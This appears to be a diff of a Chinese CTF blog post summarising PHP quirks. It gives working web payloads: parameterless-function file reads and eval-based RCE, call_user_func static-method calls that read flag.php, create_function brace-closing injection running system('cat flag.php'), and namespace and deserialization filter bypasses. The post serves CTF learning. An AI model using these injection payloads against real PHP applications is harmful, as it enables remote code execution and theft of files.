-<code>ctfshow[]=ctfshow&amp;ctfshow[]=getFlag</code><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621743.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621743.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621743.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621743.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621743.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621743.png 2x" sizes=auto alt=image.png></a></figure></p><h2 id=call_user_func class=headerLink><a href=#call_user_func class=header-mark></a>call_user_func()</h2><p><code>call_user_func(callable $callback, mixed ...$args): mixed</code>
-调用回调函数, 通常用来做免杀, 不过也可以调用类里面的方法
-<strong>静态方法</strong></p><pre tabindex=0><code>call_user_func(&#39;myclass::static_method&#39;)
-</code></pre><p><strong>传递数组 (动态/静态)</strong></p><pre tabindex=0><code>call_user_func(array(&#39;myclass&#39;, &#39;static_method&#39;));
-
-call_user_func(array(new myclass(), &#39;dynamic_method&#39;));
-</code></pre><h2 id=create_function class=headerLink><a href=#create_function class=header-mark></a>create_function()</h2><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621797.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621797.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621797.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621797.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621797.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621797.png 2x" sizes=auto alt=image.png></a></figure>创建匿名函数, 不过这个比较特别, 第一个位置传递的是匿名函数的参数 (有时候可以绕过过滤)
-闭合括号执行任意代码
-<code>create_function('', "system('whoami');//");</code>
-<a href=https://paper.seebug.org/755/ target=_blank rel="noopener noreferrer">Code Breaking 挑战赛 Writeup</a></p><h2 id=根命名空间--绕过过滤 class=headerLink><a href=#%e6%a0%b9%e5%91%bd%e5%90%8d%e7%a9%ba%e9%97%b4--%e7%bb%95%e8%bf%87%e8%bf%87%e6%bb%a4 class=header-mark></a>根命名空间 \ 绕过过滤</h2><blockquote><p>PHP 的命名空间默认为 , 所有的函数和类都在 \ 这个命名空间中, 如果直接写函数名 function_name() 调用, 调用的时候其实相当于写了一个相对路径; 而如果写 \function_name() 这样调用函数. 则其实是写了一个绝对路径. 如果你在其他 namespace 里调用系统类, 就必须写绝对路径这种写法.</p></blockquote><p>有时候可以绕过一些正则, 比如执行的代码不允许以字母开头
-<code>\phpinfo();</code></p><pre tabindex=0><code>&lt;?php
-highlight_file(__FILE__);
-
-if(isset($_POST[&#39;ctf&#39;])){
-    $ctfshow = $_POST[&#39;ctf&#39;];
-    if(!preg_match(&#39;/^[a-z0-9_]*$/isD&#39;,$ctfshow)) {
-        $ctfshow(&#39;&#39;,$_GET[&#39;show&#39;]);
-    }
-
-}
-</code></pre><p>创建的匿名函数里面实际上也是字符串, 可以闭合大括号来执行任意代码 (否则不好直接回显)
-注意要注释掉本来的 <code>}</code></p><pre tabindex=0><code>GET: ?show=}system(&#39;cat flag.php&#39;);//
-POST: ctf=\create_function	
-</code></pre><h2 id=__autoload-和-class_exists class=headerLink><a href=#__autoload-%e5%92%8c-class_exists class=header-mark></a>__autoload 和 class_exists()</h2><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621752.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621752.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621752.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621752.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621752.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621752.png 2x" sizes=auto alt=image.png></a></figure><code>__autoload </code>是为了定义 PHP 加载未知类的时候进行的操作, 之前强网杯也出过 <code>spl_autoload </code>相关的题 (<code>spl_autoload </code>是 <code>__autoload </code>的默认实现)
-这里需要注意的是用 <code>class_exist </code>检查一个类是否存在的时候, 默认会<strong>自动</strong>调用 <code>__autoload </code>方法</p><h2 id=属性类型不敏感 class=headerLink><a href=#%e5%b1%9e%e6%80%a7%e7%b1%bb%e5%9e%8b%e4%b8%8d%e6%95%8f%e6%84%9f class=header-mark></a>属性类型不敏感</h2><p>在 PHP 7.1 + 的版本中, 对属性类型 (public protected private) 不敏感
-因为 protected 和 private 反序列化后的结果中含有 <code>%00</code>, 部分题目会禁止这种字符, 可在构造 payload 时将属性全部改成 public 来绕过限制</p></div><h2>相关内容</h2><div class=related-container><div class=related-item-container><h2 class=related-title><a href=/posts/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/>[反序列化]POP链</a></h2></div></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>更新于 4043-33-43</span></div><div class=post-info-license></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><button title="分享到 Twitter" data-sharer=twitter data-url=https://nexuzzz0.github.io/posts/php%E7%89%B9%E6%80%A7/php%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/ data-title=[PHP特性]总结 data-hashtags=反序列化,PHP><span class="fab fa-twitter fa-fw"></span></button><button title="分享到 Facebook" data-sharer=facebook data-url=https://nexuzzz0.github.io/posts/php%E7%89%B9%E6%80%A7/php%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/ data-hashtag=反序列化><span class="fab fa-facebook-square fa-fw"></span></button><button title="分享到 WhatsApp" data-sharer=whatsapp data-url=https://nexuzzz0.github.io/posts/php%E7%89%B9%E6%80%A7/php%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/ data-title=[PHP特性]总结 data-web><span class="fab fa-whatsapp fa-fw"></span></button><button title="分享到 Line" data-sharer=line data-url=https://nexuzzz0.github.io/posts/php%E7%89%B9%E6%80%A7/php%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/ data-title=[PHP特性]总结><span data-svg-src=/lib/simple-icons/icons/line.min.svg></span></button><button title="分享到 微博" data-sharer=weibo data-url=https://nexuzzz0.github.io/posts/php%E7%89%B9%E6%80%A7/php%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/ data-title=[PHP特性]总结><span class="fab fa-weibo fa-fw"></span></button><button title="分享到 Myspace" data-sharer=myspace data-url=https://nexuzzz0.github.io/posts/php%E7%89%B9%E6%80%A7/php%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/ data-title=[PHP特性]总结 data-description><span data-svg-src=/lib/simple-icons/icons/myspace.min.svg></span></button><button title="分享到 Blogger" data-sharer=blogger data-url=https://nexuzzz0.github.io/posts/php%E7%89%B9%E6%80%A7/php%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/ data-title=[PHP特性]总结 data-description><span class="fab fa-blogger fa-fw"></span></button><button title="分享到 Evernote" data-sharer=evernote data-url=https://nexuzzz0.github.io/posts/php%E7%89%B9%E6%80%A7/php%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/ data-title=[PHP特性]总结><span class="fab fa-evernote fa-fw"></span></button></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw"></i>&nbsp;<a href=/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/>反序列化</a>,&nbsp;<a href=/tags/php/>PHP</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>返回</a></span>&nbsp;|&nbsp;<span><a href=/>主页</a></span></section></div><div class=post-nav><a href=/posts/ssrf/ssrfctfhub-ssrf/ class=prev rel=prev title="[SSRF]CTFHUB SSRF"><i class="fas fa-angle-left fa-fw"></i>[SSRF]CTFHUB SSRF</a></div></div><div id=comments></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2023 - 2024</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank rel="noopener noreferrer"></a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div><div class=footer-line></div><div class=footer-line></div></div></footer></div><div id=fixed-buttons><a href=#back-to-top id=back-to-top-button class=fixed-button title=回到顶部><i class="fas fa-arrow-up fa-fw"></i>
+</span></span></span></code></pre></div><h2 id=无参数函数读文件rce class=headerLink><a href=#%e6%97%a0%e5%8f%82%e6%95%b0%e5%87%bd%e6%95%b0%e8%af%bb%e6%96%87%e4%bb%b6rce class=header-mark></a>无参数函数读文件/RCE</h2><p>无参数函数指形如 <code>a(b(c()))</code> 这种不需要参数或者只需要一个参数, 并且对应的参数可以通过另一个函数的返回值来获取的函数</p><p>例如在当前目录仅存在 <code>index.php</code> <code>flag.php</code> 的情况下, 无参数读取 <code>flag.php</code> 的内容</p><p><code>show_source(next(array_reverse(scandir(pos(localeconv())))));</code></p><p>或者是配合 get 传参进行 rce</p><p><code>eval(end(current(get_defined_vars())))</code></p><p><a href=https://www.freebuf.com/articles/system/242482.html target=_blank rel="noopener noreferrer">无参数读文件和RCE总结</a></p><p><a href=https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE target=_blank rel="noopener noreferrer">PHP Parametric Function RCE</a></p><h2 id=nlcpmvtee写文件 class=headerLink><a href=#nlcpmvtee%e5%86%99%e6%96%87%e4%bb%b6 class=header-mark></a>nl、cp、mv、tee写文件</h2><p>在禁命令的时候没有限制写文件：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>nl flag.php&gt;1.txt
+</span></span><span class=line><span class=cl>cp flag.php&gt;1.txt
+</span></span><span class=line><span class=cl>mv flag.php&gt;1.txt
+</span></span></code></pre></div><p>tee指令会从标准输入设备读取数据，将其内容输出到标准输出设备，同时保存成文件</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>ls /|tee 1
+</span></span><span class=line><span class=cl>然后访问/1下载文件
+</span></span></code></pre></div><h2 id=静态调用方法 class=headerLink><a href=#%e9%9d%99%e6%80%81%e8%b0%83%e7%94%a8%e6%96%b9%e6%b3%95 class=header-mark></a>静态调用方法</h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>&lt;?php
+</span></span><span class=line><span class=cl>error_reporting(0);
+</span></span><span class=line><span class=cl>highlight_file(__FILE__);
+</span></span><span class=line><span class=cl>class ctfshow
+</span></span><span class=line><span class=cl>{
+</span></span><span class=line><span class=cl>    function __wakeup(){
+</span></span><span class=line><span class=cl>        die(&#34;private class&#34;);
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>    static function getFlag(){
+</span></span><span class=line><span class=cl>        echo file_get_contents(&#34;flag.php&#34;);
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>}
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>call_user_func($_POST[&#39;ctfshow&#39;]);
+</span></span></code></pre></div><p>两种方式</p><p><strong>通过</strong><code>**::**</code><strong>访问</strong></p><p><code>ctfshow=ctfshow::getFlag</code></p><p><strong>通过 <strong><code>**call_user_func($_POST['ctfshow'])**</code></strong> 以数组形式调用静态方法</strong></p><p><code>ctfshow[]=ctfshow&amp;ctfshow[]=getFlag</code></p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105113.png title=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105113.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105113.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105113.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105113.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105113.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105113.png 2x" sizes=auto alt=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105113.png></a></figure></p><h2 id=call_user_func class=headerLink><a href=#call_user_func class=header-mark></a>call_user_func()</h2><p><code>call_user_func(callable $callback, mixed ...$args): mixed</code></p><p>调用回调函数, 通常用来做免杀, 不过也可以调用类里面的方法</p><p><strong>静态方法</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>call_user_func(&#39;myclass::static_method&#39;)
+</span></span></code></pre></div><p><strong>传递数组 (动态/静态)</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>call_user_func(array(&#39;myclass&#39;, &#39;static_method&#39;));
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>call_user_func(array(new myclass(), &#39;dynamic_method&#39;));
+</span></span></code></pre></div><h2 id=create_function class=headerLink><a href=#create_function class=header-mark></a>create_function()</h2><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105114.png title=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105114.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105114.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105114.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105114.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105114.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105114.png 2x" sizes=auto alt=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105114.png></a></figure></p><p>创建匿名函数, 不过这个比较特别, 第一个位置传递的是匿名函数的参数 (有时候可以绕过过滤)</p><p>闭合括号执行任意代码</p><p><code>create_function('', "system('whoami');//");</code></p><p><a href=https://paper.seebug.org/755/ target=_blank rel="noopener noreferrer">Code Breaking 挑战赛 Writeup</a></p><h2 id=根命名空间--绕过过滤 class=headerLink><a href=#%e6%a0%b9%e5%91%bd%e5%90%8d%e7%a9%ba%e9%97%b4--%e7%bb%95%e8%bf%87%e8%bf%87%e6%bb%a4 class=header-mark></a>根命名空间 \ 绕过过滤</h2><blockquote><p>PHP 的命名空间默认为 , 所有的函数和类都在 \ 这个命名空间中, 如果直接写函数名 function_name() 调用, 调用的时候其实相当于写了一个相对路径; 而如果写 \function_name() 这样调用函数. 则其实是写了一个绝对路径. 如果你在其他 namespace 里调用系统类, 就必须写绝对路径这种写法.</p></blockquote><p>有时候可以绕过一些正则, 比如执行的代码不允许以字母开头</p><p><code>\phpinfo();</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>&lt;?php
+</span></span><span class=line><span class=cl>highlight_file(__FILE__);
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>if(isset($_POST[&#39;ctf&#39;])){
+</span></span><span class=line><span class=cl>    $ctfshow = $_POST[&#39;ctf&#39;];
+</span></span><span class=line><span class=cl>    if(!preg_match(&#39;/^[a-z0-9_]*$/isD&#39;,$ctfshow)) {
+</span></span><span class=line><span class=cl>        $ctfshow(&#39;&#39;,$_GET[&#39;show&#39;]);
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>}
+</span></span></code></pre></div><p>创建的匿名函数里面实际上也是字符串, 可以闭合大括号来执行任意代码 (否则不好直接回显)</p><p>注意要注释掉本来的 <code>}</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>GET: ?show=}system(&#39;cat flag.php&#39;);//
+</span></span><span class=line><span class=cl>POST: ctf=\create_function	
+</span></span></code></pre></div><h2 id=__autoload-和-class_exists class=headerLink><a href=#__autoload-%e5%92%8c-class_exists class=header-mark></a>__autoload 和 class_exists()</h2><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105115.png title=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105115.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105115.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105115.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105115.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105115.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105115.png 2x" sizes=auto alt=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105115.png></a></figure></p><p><code>__autoload </code>是为了定义 PHP 加载未知类的时候进行的操作, 之前强网杯也出过 <code>spl_autoload </code>相关的题 (<code>spl_autoload </code>是 <code>__autoload </code>的默认实现)</p><p>这里需要注意的是用 <code>class_exist </code>检查一个类是否存在的时候, 默认会<strong>自动</strong>调用 <code>__autoload </code>方法</p><h2 id=属性类型不敏感 class=headerLink><a href=#%e5%b1%9e%e6%80%a7%e7%b1%bb%e5%9e%8b%e4%b8%8d%e6%95%8f%e6%84%9f class=header-mark></a>属性类型不敏感</h2><p>在 PHP 7.1 + 的版本中, 对属性类型 (public protected private) 不敏感</p><p>因为 protected 和 private 反序列化后的结果中含有 <code>%00</code>, 部分题目会禁止这种字符, 可在构造 payload 时将属性全部改成 public 来绕过限制</p></div><h2>相关内容</h2><div class=related-container><div class=related-item-container><h2 class=related-title><a href=/posts/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/>[反序列化]POP链</a></h2></div></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>更新于 4043-33-43</span></div><div class=post-info-license></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><button title="分享到 Twitter" data-sharer=twitter data-url=https://nexuzzz0.github.io/posts/php%E7%89%B9%E6%80%A7/php%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/ data-title=[PHP特性]总结 data-hashtags=反序列化,PHP><span class="fab fa-twitter fa-fw"></span></button><button title="分享到 Facebook" data-sharer=facebook data-url=https://nexuzzz0.github.io/posts/php%E7%89%B9%E6%80%A7/php%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/ data-hashtag=反序列化><span class="fab fa-facebook-square fa-fw"></span></button><button title="分享到 WhatsApp" data-sharer=whatsapp data-url=https://nexuzzz0.github.io/posts/php%E7%89%B9%E6%80%A7/php%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/ data-title=[PHP特性]总结 data-web><span class="fab fa-whatsapp fa-fw"></span></button><button title="分享到 Line" data-sharer=line data-url=https://nexuzzz0.github.io/posts/php%E7%89%B9%E6%80%A7/php%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/ data-title=[PHP特性]总结><span data-svg-src=/lib/simple-icons/icons/line.min.svg></span></button><button title="分享到 微博" data-sharer=weibo data-url=https://nexuzzz0.github.io/posts/php%E7%89%B9%E6%80%A7/php%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/ data-title=[PHP特性]总结><span class="fab fa-weibo fa-fw"></span></button><button title="分享到 Myspace" data-sharer=myspace data-url=https://nexuzzz0.github.io/posts/php%E7%89%B9%E6%80%A7/php%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/ data-title=[PHP特性]总结 data-description><span data-svg-src=/lib/simple-icons/icons/myspace.min.svg></span></button><button title="分享到 Blogger" data-sharer=blogger data-url=https://nexuzzz0.github.io/posts/php%E7%89%B9%E6%80%A7/php%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/ data-title=[PHP特性]总结 data-description><span class="fab fa-blogger fa-fw"></span></button><button title="分享到 Evernote" data-sharer=evernote data-url=https://nexuzzz0.github.io/posts/php%E7%89%B9%E6%80%A7/php%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/ data-title=[PHP特性]总结><span class="fab fa-evernote fa-fw"></span></button></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw"></i>&nbsp;<a href=/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/>反序列化</a>,&nbsp;<a href=/tags/php/>PHP</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>返回</a></span>&nbsp;|&nbsp;<span><a href=/>主页</a></span></section></div><div class=post-nav><a href=/posts/ssrf/ssrfctfhub-ssrf/ class=prev rel=prev title="[SSRF]CTFHUB SSRF"><i class="fas fa-angle-left fa-fw"></i>[SSRF]CTFHUB SSRF</a>
+<a href=/posts/python/ssti%E6%80%BB%E7%BB%93/ class=next rel=next title=[SSTI]总结>[SSTI]总结<i class="fas fa-angle-right fa-fw"></i></a></div></div><div id=comments></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2023 - 2024</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank rel="noopener noreferrer"></a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div><div class=footer-line></div><div class=footer-line></div></div></footer></div><div id=fixed-buttons><a href=#back-to-top id=back-to-top-button class=fixed-button title=回到顶部><i class="fas fa-arrow-up fa-fw"></i>
 </a><a href=# id=view-comments class=fixed-button title=查看评论><i class="fas fa-comment fa-fw"></i></a></div><div class=assets><link rel=stylesheet href=/lib/katex/katex.min.css><link rel=preload as=style onload='this.onload=null,this.rel="stylesheet"' href=/lib/katex/copy-tex.min.css><noscript><link rel=stylesheet href=/lib/katex/copy-tex.min.css></noscript><script type=text/javascript>window.config={code:{copyTitle:"复制到剪贴板",maxShownLines:10},comment:{},data:{"desktop-header-typeit":"Nexuzzz0's BLOG","mobile-header-typeit":"Nexuzzz0's BLOG"},math:{delimiters:[{display:!0,left:"$$",right:"$$"},{display:!0,left:"\\[",right:"\\]"},{display:!1,left:"$",right:"$"},{display:!1,left:"\\(",right:"\\)"}],strict:!1},search:{distance:100,findAllMatches:!1,highlightTag:"em",ignoreFieldNorm:!1,ignoreLocation:!1,isCaseSensitive:!1,location:0,maxResultLength:10,minMatchCharLength:2,noResultsFound:"没有找到结果",snippetLength:50,threshold:.3,useExtendedSearch:!1},sharerjs:!0,table:{sort:!0},typeit:{cursorChar:"|",cursorSpeed:1e3,data:{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},duration:-1,speed:100}}</script><script type=text/javascript src=/lib/tablesort/tablesort.min.js></script><script type=text/javascript src=/lib/clipboard/clipboard.min.js></script><script type=text/javascript src=/lib/sharer/sharer.min.js></script><script type=text/javascript src=/lib/typeit/typeit.min.js></script><script type=text/javascript src=/lib/katex/katex.min.js defer></script><script type=text/javascript src=/lib/katex/auto-render.min.js defer></script><script type=text/javascript src=/lib/katex/copy-tex.min.js defer></script><script type=text/javascript src=/lib/katex/mhchem.min.js defer></script><script type=text/javascript src=/js/katex.min.js defer></script><script type=text/javascript src=/js/theme.min.js defer></script></div></body></html>
